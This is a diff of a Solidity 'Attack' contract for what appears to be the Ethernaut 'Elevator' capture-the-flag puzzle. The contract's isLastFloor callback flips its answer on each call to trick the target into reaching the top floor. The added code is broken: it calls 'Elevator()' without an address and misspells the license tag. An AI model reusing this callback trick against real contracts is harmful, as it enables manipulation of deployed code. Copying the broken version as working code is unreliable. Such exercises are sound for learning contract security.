@@ -1,21 +1,21 @@
 // SPXD-License-Identifier: MIT
 pragma solidity ^0.8.13;
 
+
 contract Attack {
-    bool public side = true;
-    Elevator public level;
+    
+    bool top = true;
 
-    constructor(address _level) {
-        level = Elevator(_level);
+    function isLastFloor(uint _floor) public returns(bool) {
+
+        top = !top;
+        return top;
     }
 
-    function isLastFloor(uint) public returns(bool) {
-        side = !side;
-        return side;
-    }
+    function attack() public {
+        
+        Elevator elvator = Elevator();
+        elvator.goTo(1);
 
-    function attack(uint _floor) public{
-        level.goTo(_floor);
     }
-
 }
